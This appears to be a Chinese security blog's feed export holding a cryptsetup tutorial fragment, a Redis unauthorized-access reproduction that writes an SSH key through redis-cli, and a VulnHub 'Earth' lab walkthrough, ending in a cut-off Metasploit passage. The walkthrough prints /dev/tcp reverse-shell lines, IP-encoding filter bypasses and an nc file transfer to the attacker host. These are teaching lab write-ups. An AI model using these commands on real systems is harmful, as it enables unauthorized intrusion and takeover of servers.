建立回送磁盘映，利用命令dd来建立一个空磁盘映象，然后将该映象作为回送设备来装载。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=~/secret.img bs=1M count=100</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441b07a09db.png" /></p>
<p>新建了一个大小为100
MB的磁盘映象，该映象名字为secret.img。要想改变其大小，可以改变count的值。
接下来，先找到一个空的回环设备，再利用losetup命令将该映象和它联系起来，由下图知loop10是空的，故用命令：losetup
/dev/loop10 ~/secret.img</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441b222f766.png" /></p>
<p>此时已经得到了一个虚拟的块设备，其位于/dev/loop10，并且能够如同使用其它设备那样来使用它。
下面使用cryptsetup来建立逻辑卷，并将其与块设备捆绑(使用前面建立的回送映象作为虚拟块设备)：其中，以myEncryptedFilesystem
作为新建的逻辑卷的名称，执行以下命令,并输入逻辑卷的口令(-y的作用在于输入两次口令以确保无误)；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cryptsetup -y create myEncryptedFilesystem /dev/loop10</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441b486af29.png" /></p>
<p>可以使用命令sudo dmsetup
ls检查逻辑卷是否已经建立（如下图，已经成功建立了逻辑卷）；</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441b6f6d5ae.png" /></p>
<p>device-mapper会把它的虚拟设备装载到/dev/mapper下面，所以虚拟块设备应该是/dev/mapper/myEncryptedFilesystem
，写入的数据会经过透明加密，然后将密文写入。
如同物理设备一样，也可以在虚拟设备上创建文件系统：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkfs.ext3 /dev/mapper/myEncryptedFilesystem</span><br></pre></td></tr></table></figure>
<p>现在为新的虚拟块设备建立一个装载点，然后将其装载。命令如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/myEncryptedFilesystem</span><br><span class="line">mount /dev/mapper/myEncryptedFilesystem /mnt/myEncryptedFilesystem</span><br></pre></td></tr></table></figure>
<p>可利用命令df -h
/mnt/myEncryptedFilesystem查看装载的文件系统的情况（下图）：</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_62441b81b3fb5.png" /></p>
<h4
id="参考1.鸟哥.鸟哥的linux私房菜基础学习篇第四版m.北京人民邮电出版社-2018.4">参考：[1].鸟哥.鸟哥的Linux私房菜基础学习篇(第四版)[M].北京:人民邮电出版社
2018.4</h4>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>GRUB加密</tag>
        <tag>Linux内核编译</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis 未授权访问漏洞复现及利用</title>
    <url>/2022/03/13/redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h3 id="redis漏洞原理"><strong>1. Redis漏洞原理</strong></h3>
<p>Redis 默认情况下，绑定在
0.0.0.0:6379，会将Redis服务暴露到公网上，如果在没有开启身份认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问Redis以及读取Redis的数据。
攻击者在未授权访问Redis的情况下可以利用Redis的相关方法和命令，可以进行写文件操作，如果运行
redis 的用户是 root 用户，攻击者可以成功将自己的公钥写入目标服务器的
/root/.ssh 文件夹的authotrized_keys
文件中，进而可以直接登录目标服务器。</p>
<h3 id="漏洞危害"><strong>2. 漏洞危害</strong></h3>
<ul>
<li>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</li>
<li>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</li>
<li>最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器。</li>
</ul>
<h3 id="漏洞复现"><strong>3. 漏洞复现</strong></h3>
<h4 id="redis的安装"><strong>1、Redis的安装</strong></h4>
<p><strong>下载</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> http://download.redis.io/releases/redis-<span class="number">2</span>.<span class="number">8</span>.<span class="number">17</span>.tar.gz</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dc1e5bfc3c.png" /></p>
<p><strong>解压安装</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tar</span> xzf redis-<span class="number">2</span>.<span class="number">8</span>.<span class="number">17</span>.tar.gz</span><br><span class="line"><span class="attribute">cd</span> redis-<span class="number">2</span>.<span class="number">8</span>.<span class="number">17</span></span><br><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dc1f578715.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dc22ce95bc.png" /></p>
<p><strong>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dc254a8fab.png" /></p>
<p><strong>将redis.conf拷贝到/etc/目录下，并使用/etc/目录下的reids.conf文件中的配置启动redis服务：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dced173834.png" /></p>
<h4 id="漏洞测试"><strong>2、漏洞测试</strong></h4>
<p>使用redis客户端直接无账号成功登录redis：从登录的结果可以看出该redis服务对公网开放，且未开启认证。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dd9f181686.png" /></p>
<p><strong>说明：</strong>1 是开启认证的情况，2 是未开启认证（可利用）。
<strong>备注，</strong>默认情况下6379端口</p>
<h4
id="利用ssh的公私钥获取运行-redis-用户的权限"><strong>3、利用ssh的公私钥获取运行
redis 用户的权限</strong></h4>
<ul>
<li><strong>本地生成ssh公钥和私钥（密码置空）</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dd2ed56278.png" /></p>
<ul>
<li><strong>将生成的公钥的值写入目标服务器</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> (<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; tmp.txt</span><br><span class="line"><span class="built_in">cat</span> tmp.txt  redis-cli -h IP -p PORT -x <span class="built_in">set</span> crackit</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dd46947dd0.png" /></p>
<p><strong>注意：</strong>加上 <code>\n\n</code> 是为了不破坏 ssh public
key，crackit 是设置的 key，可随意指定</p>
<ul>
<li><strong>远程登录目标的redis服务</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622dddea5720f.png" /></p>
<ul>
<li><strong>利用sshh免密登录目标</strong></li>
</ul>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">ssh root<span class="variable">@IP</span> -i ~<span class="regexp">/.ssh/id</span>_rsa</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/03/img_622ddd4c4bc86.png" /></p>
<h3 id="安全建议"><strong>4. 安全建议</strong></h3>
<h4
id="配置bindredis.conf文件"><strong>1、配置bind（redis.conf文件）</strong></h4>
<p><strong>对bind配置，限定可以连接Redis服务器的IP，也可修改 Redis
的默认端口6379</strong></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># If you want you can bind a single interface, if the bind option is not</span></span><br><span class="line"><span class="comment"># specified all the interfaces will listen for incoming connections.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># bind 127.0.0.1</span></span><br></pre></td></tr></table></figure>
<p>将 #bind
127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server
path/redis.conf
即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录。</p>
<h4
id="设置密码以提供远程登陆"><strong>2、设置密码，以提供远程登陆</strong></h4>
<p>打开redis.conf配置文件，找到requirepass，然后修改如下:</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">requirepass yourpassword</span><br><span class="line">yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。</span><br><span class="line">  </span><br><span class="line">命令如下:</span><br><span class="line">redis-<span class="keyword">cli</span> -<span class="keyword">h</span> yourIp -p yourPort<span class="comment">//启动redis客户端，并连接服务器</span></span><br><span class="line">keys * <span class="comment">//输出服务器中的所有key</span></span><br><span class="line">报错如下</span><br><span class="line">(<span class="keyword">error</span>) <span class="keyword">ERR</span> operation not permitted</span><br><span class="line">  </span><br><span class="line">这时候你可以用授权命令进行授权，就不报错了</span><br><span class="line">  </span><br><span class="line">命令如下:</span><br><span class="line">auth youpassword</span><br></pre></td></tr></table></figure>
<h4
id="配置rename-command-配置项-rename_config这样即使存在未授权访问也能够给攻击者使用config-指令加大难度"><strong>3、配置rename-command
配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config
指令加大难度</strong></h4>
<h3 id="参考"><strong>5. 参考</strong></h3>
<p>https://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/
https://www.cnblogs.com/bmjoker/p/9548962.html</p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>The Planets：Earth</title>
    <url>/2023/08/23/the-planets%EF%BC%9Aearth/</url>
    <content><![CDATA[<blockquote>
<p><strong>靶机介绍及下载</strong>：<a
href="https://www.vulnhub.com/entry/the-planets-earth,755/">The Planets:
Earth ~ VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机发现靶机-ip">1.1. 主机发现【靶机 <code>IP</code>】</h3>
<ul>
<li>主机探测的方法及工具介绍可以参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15574388.html">主动信息收集之主机发现
- z9m8r8 - 博客园</a>，以 <code>netdiscover</code> 探测为例：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># netdiscover -i eth0 -r 192.168.159.0/24</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20netdiscover.jpg"
alt="The Planets Earth netdiscover.jpg" />
<figcaption aria-hidden="true">The Planets Earth
netdiscover.jpg</figcaption>
</figure>
<ul>
<li><strong>靶机</strong>
<code>IP</code>：<code>192.168.159.141</code></li>
</ul>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<ul>
<li>端口扫描的方法和工具介绍可以参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/15615756.html">主动信息收集之端口扫描
- z9m8r8 - 博客园</a>，以 <code>nmap</code> 扫描为例：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nmap -sS 192.168.159.141 -p1-65535</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20nmap%20port.jpg"
alt="The Planets Earth nmap port.jpg" />
<figcaption aria-hidden="true">The Planets Earth nmap
port.jpg</figcaption>
</figure>
<ul>
<li>简要分析，由上可知开放了22，80，443端口，22 端口的 <code>ssh</code>
可尝试弱口令爆破【非优选，后面用 hydra
试了下没成功，初步推断不存在弱口令，hydra 使用可参见：<a
href="https://www.cnblogs.com/z9m8r8/articles/16592988.html">密码破解 -
z9m8r8 - 博客园</a>】，80和443端口可浏览器访问，目录遍历和用
<code>nmap</code> 等扫描进一步获取可用信息。</li>
</ul>
<h3 id="web-服务信息收集">1.3. Web 服务信息收集</h3>
<ul>
<li>浏览器访问靶机</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https.jpg"
alt="The Planets Earth https.jpg" />
<figcaption aria-hidden="true">The Planets Earth https.jpg</figcaption>
</figure>
<ul>
<li>没注意到有可用的信息，利用 <code>dirsearch</code>
尝试目录遍历，依旧没发现有价值信息，继续用 <code>nmap</code>
进一步获取信息。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20nmap%20dns.jpg"
alt="The Planets Earth nmap dns.jpg" />
<figcaption aria-hidden="true">The Planets Earth nmap
dns.jpg</figcaption>
</figure>
<ul>
<li>看到两个 <strong>DNS 解析</strong>，修改 hosts【让
<code>terratest.earth.local</code> 和<code>earth.local</code> 指向靶机
<code>IP</code> )】 ，浏览器访问+目录遍历</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20.jpg"
alt="The Planets Earth https earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local%20.jpg"
alt="The Planets Earth https terratest-earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local .jpg</figcaption>
</figure>
<ul>
<li>目录遍历结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://terratest.earth.local/&quot;</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20dirsearch%20%20terratest-earth-local%20.jpg"
alt="The Planets Earth dirsearch terratest-earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth dirsearch
terratest-earth-local .jpg</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;https://earth.local/&quot;    </span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20dirsearch%20%20earth-local%20.jpg"
alt="The Planets Earth dirsearch earth-local .jpg" />
<figcaption aria-hidden="true">The Planets Earth dirsearch earth-local
.jpg</figcaption>
</figure>
<ul>
<li>分别访问 <a
href="https://earth.local/admin/login">https://earth.local/admin/login</a>
【可考虑弱口令，SQL 注入等】和 <a
href="https://terratest.earth.local/robots.txt">https://terratest.earth.local/robots.txt</a>
反馈如下：</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login.jpg"
alt="The Planets Earth https earth-local-admin-login.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-robots-txt.jpg"
alt="The Planets Earth https terratest-earth-local-robots-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-robots-txt.jpg</figcaption>
</figure>
<ul>
<li>进一步访问 <a
href="https://terratest.earth.local/testingnotes.txt">https://terratest.earth.local/testingnotes.txt</a>
【后缀可以猜一下或去爆破均可】</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testingnotes-txt.jpg"
alt="The Planets Earth https terratest-earth-local-testingnotes-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testingnotes-txt.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testingnotes-txt-en-zh.jpg"
alt="The Planets Earth https terratest-earth-local-testingnotes-txt-en-zh.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testingnotes-txt-en-zh.jpg</figcaption>
</figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20terratest-earth-local-testdata-txt.jpg"
alt="The Planets Earth https terratest-earth-local-testdata-txt.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
terratest-earth-local-testdata-txt.jpg</figcaption>
</figure>
<ul>
<li>简要分析，由此可知前面发送消息使用 <code>XOR</code>
作为加密算法，而当前可获得之前已发送消息的密文，密文和testdata.txt
<code>XOR</code> 便可知密钥 key，admin/login 登录的账号为 terra，猜测
key 可能是 terra 登录的密码。</li>
<li>密钥 key 的获取，将 testdata.txt 转为 16
进制，在于之前的密文做异或。</li>
</ul>
<blockquote>
<p>According to radiometric dating estimation and other evidence, Earth
formed over 4.5 billion years ago. Within the first billion years of
Earth's history, life appeared in the oceans and began to affect Earth's
atmosphere and surface, leading to the proliferation of anaerobic and,
later, aerobic organisms. Some geological evidence indicates that life
may have arisen as early as 4.1 billion years ago.</p>
<hr />
<p>4163636f7264696e6720746f20726164696f6d657472696320646174696e6720657374696d6174696f6e20616e64206f746865722065766964656e63652c20456172746820666f726d6564206f76657220342e352062696c6c696f6e2079656172732061676f2e2057697468696e207468652066697273742062696c6c696f6e207965617273206f66204561727468277320686973746f72792c206c69666520617070656172656420696e20746865206f6365616e7320616e6420626567616e20746f2061666665637420456172746827732061746d6f73706865726520616e6420737572666163652c206c656164696e6720746f207468652070726f6c696665726174696f6e206f6620616e6165726f62696320616e642c206c617465722c206165726f626963206f7267616e69736d732e20536f6d652067656f6c6f676963616c2065766964656e636520696e646963617465732074686174206c696665206d617920686176652061726973656e206173206561726c7920617320342e312062696c6c696f6e2079656172732061676f2e</p>
</blockquote>
<ul>
<li>已知的密文有三条，通过逐条测试得发现 testdata.txt 与 2402111b1a0……
相对应，并解出 key 为 <code>earthclimatechangebad4humans</code>
，具体操作如下：</li>
<li><a href="https://www.toolhelper.cn/SymmetricEncryption/XOR">异或
加密/解密 - 在线工具</a></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20key.jpg"
alt="The Planets Earth https earth-local key.jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
key.jpg</figcaption>
</figure>
<ul>
<li><a href="http://ku51.net/ox2str/">在线字符串转16进制 -
16进制转换成字符串</a></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local%20key-hex-string.jpg"
alt="The Planets Earth https earth-local key-hex-string.jpg" />
<figcaption aria-hidden="true">The Planets Earth https earth-local
key-hex-string.jpg</figcaption>
</figure>
<ul>
<li>如果不放心可以用这个 key 重新发下 testdata.txt 作以验证。</li>
</ul>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="管理门户登录">2.1. 管理门户登录</h3>
<ul>
<li>用前面得到 <code>terra/earthclimatechangebad4humans</code> 在
admin/login 页面登录测试。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-terra.jpg"
alt="The Planets Earth https earth-local-admin-login-terra.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-terra.jpg</figcaption>
</figure>
<ul>
<li>成功进入，发现可以远程执行命令，查找 flag</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-user-flag.jpg"
alt="The Planets Earth https earth-local-user-flag.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-user-flag.jpg</figcaption>
</figure>
<ul>
<li>只找到个 user_flag.txt，用
<code>cat /var/earth_web/user_flag.txt</code> 获取
flag，成功拿到一个<code>user_flag_3353b67d6437f07ba7d34afd7d2fc27d</code>
。</li>
</ul>
<h3 id="反弹-shell">2.2. 反弹 shell</h3>
<ul>
<li>尝试写个反弹 shell</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.159.152/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-ip-shell.jpg"
alt="The Planets Earth https earth-local-admin-login-ip-shell.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-ip-shell.jpg</figcaption>
</figure>
<ul>
<li>禁止远程连接！看其他人的说法是对点分十进制的 IP
有限制，所以考虑绕过，对 IP
进行16进制或10进制转换【经测试两种都可绕过】，后面以转成10进制【<a
href="https://www.ipaddressguide.com/ip">IPv4 Address to IP Decimal
Conversion IPAddressGuide</a>】为例演示。</li>
<li>攻击机开启开启监听</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -nvlp 4444</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232276376/4444 0&gt;&amp;1    <span class="comment">#10进制</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/0xc0.0xa8.0x9f.0x98/4444 0&gt;&amp;1   <span class="comment">#16进制</span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>成功反弹！</strong></li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-ip-de-shell.jpg"
alt="The Planets Earth https earth-local-admin-login-ip-de-shell.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-ip-de-shell.jpg</figcaption>
</figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=48(apache) gid=48(apache) <span class="built_in">groups</span>=48(apache)</span><br><span class="line">bash-5.1$ <span class="built_in">cd</span> /root</span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">bash: <span class="built_in">cd</span>: /root: Permission denied</span><br></pre></td></tr></table></figure>
<ul>
<li>权限不够，考虑提权。</li>
</ul>
<h3 id="提权">2.3. 提权</h3>
<ul>
<li><strong>查询可提权命令</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
<ul>
<li>执行结果</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/bin/chage</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/reset_root</span><br><span class="line">/usr/sbin/grub2-set-bootflag</span><br><span class="line">/usr/sbin/pam_timestamp_check</span><br><span class="line">/usr/sbin/unix_chkpwd</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br></pre></td></tr></table></figure>
<ul>
<li>有个reset_root，尝试执行</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1$ reset_root</span><br><span class="line">reset_root</span><br><span class="line">CHECKING IF RESET TRIGGERS PRESENT...</span><br><span class="line">RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.</span><br></pre></td></tr></table></figure>
<ul>
<li>传回 kali 调试排查原因</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash-5.1$ nc 192.168.159.152 4445 &lt; /usr/bin/reset_root</span><br><span class="line">nc 192.168.159.152 4445 &lt; /usr/bin/reset_root</span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-shell-reset_root.jpg"
alt="The Planets Earth https earth-local-admin-login-shell-reset_root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-shell-reset_root.jpg</figcaption>
</figure>
<ul>
<li>用strace调试</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># strace  ./reset_root</span></span><br></pre></td></tr></table></figure>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-strace-reset_root.jpg"
alt="The Planets Earth https earth-local-admin-login-strace-reset_root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-strace-reset_root.jpg</figcaption>
</figure>
<ul>
<li>提示没这三个文件，靶机中通过 touch 建立后再尝试</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20https%20earth-local-admin-login-reset_root-touch-file-su-root.jpg"
alt="The Planets Earth https earth-local-admin-login-reset_root-touch-file-su-root.jpg" />
<figcaption aria-hidden="true">The Planets Earth https
earth-local-admin-login-reset_root-touch-file-su-root.jpg</figcaption>
</figure>
<ul>
<li>root 密码重置及提权成功！查找 flag ，并读取。</li>
</ul>
<figure>
<img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/The%20Planets%20Earth%20flag.jpg"
alt="The Planets Earth flag.jpg" />
<figcaption aria-hidden="true">The Planets Earth flag.jpg</figcaption>
</figure>
<ul>
<li>成功拿到 <code>root_flag_b0da9554d29db2117b02aa8b66ec492e</code>
!</li>
</ul>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>一次简化的渗透实例</title>
    <url>/2021/10/16/%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8C%96%E7%9A%84%E6%B8%97%E9%80%8F%E5%AE%9E%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="信息收集">1. 信息收集</h1>
<h2 id="启动数据库服务并进入msf">1、启动数据库服务，并进入msf</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@promote:/home/z9m8r8<span class="comment"># service postgresql start</span></span><br><span class="line">root@promote:/home/z9m8r8<span class="comment"># msfdb init</span></span><br><span class="line">[i] Database already started</span><br><span class="line">[i] The database appears to be already configured, skipping initialization</span><br><span class="line">root@promote:/home/z9m8r8<span class="comment"># msfconsole </span></span><br><span class="line">     ,           ,</span><br><span class="line">    /             \</span><br><span class="line">   ((__---,,,---__))</span><br><span class="line">      (_) O O (_)_________</span><br><span class="line">         \ _ /            |\</span><br><span class="line">          o_o \   M S F   | \</span><br><span class="line">               \   _____  |  *</span><br><span class="line">                |||   WW|||</span><br><span class="line">                |||     |||</span><br><span class="line">       =[ metasploit v6.0.52-dev                          ]</span><br><span class="line">+ -- --=[ 2147 exploits - 1143 auxiliary - 365 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 8 evasion                                       ]</span><br><span class="line">Metasploit tip: Display the Framework <span class="built_in">log</span> using the </span><br><span class="line"><span class="built_in">log</span> <span class="built_in">command</span>, learn more with <span class="built_in">help</span> <span class="built_in">log</span></span><br><span class="line">msf6 &gt; db_status 